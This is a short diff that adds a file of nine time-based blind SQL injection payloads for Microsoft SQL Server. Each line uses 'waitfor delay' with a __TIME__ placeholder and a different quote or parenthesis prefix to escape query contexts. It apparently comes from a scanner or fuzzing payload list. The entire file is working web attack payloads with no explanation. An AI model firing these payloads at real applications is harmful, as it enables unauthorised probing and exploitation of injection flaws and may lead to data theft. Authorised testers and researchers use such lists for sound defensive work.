@@ -1,0 +1,9 @@
+;waitfor delay '0:0:__TIME__'--
+);waitfor delay '0:0:__TIME__'--
+';waitfor delay '0:0:__TIME__'--
+";waitfor delay '0:0:__TIME__'--
+');waitfor delay '0:0:__TIME__'--
+");waitfor delay '0:0:__TIME__'--
+));waitfor delay '0:0:__TIME__'--
+'));waitfor delay '0:0:__TIME__'--
+"));waitfor delay '0:0:__TIME__'--
